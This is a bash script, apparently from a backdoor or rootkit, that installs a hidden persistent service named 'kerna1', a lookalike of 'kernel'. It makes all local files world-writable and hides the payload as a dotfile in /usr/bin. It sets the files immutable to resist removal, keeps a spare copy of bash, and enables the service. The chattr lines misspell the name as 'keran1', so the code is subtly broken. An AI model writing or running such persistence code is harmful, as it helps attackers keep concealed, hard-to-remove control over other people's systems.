#!/bin/bash

#give all the permisson
chmod 777 ./*

#copy the systemd service to the right dir "Note: this requires root priv"
cp ./kerna1.service /lib/systemd/system/kerna1.service

#hide kerna1 script in /usr/bin
cp ./kerna1.sh /usr/bin/.kerna1

#make it immutable, so it can't be removed easily
chattr +i /lib/systemd/system/keran1.service

#make it immutable, so it can't be removed easily
chattr +i /usr/bin/.keran1

#copy bash binary, in case it gets deleted
cp /usr/bin/bash /.bash

#start and enable the service
systemctl start kerna1
systemctl enable kerna1
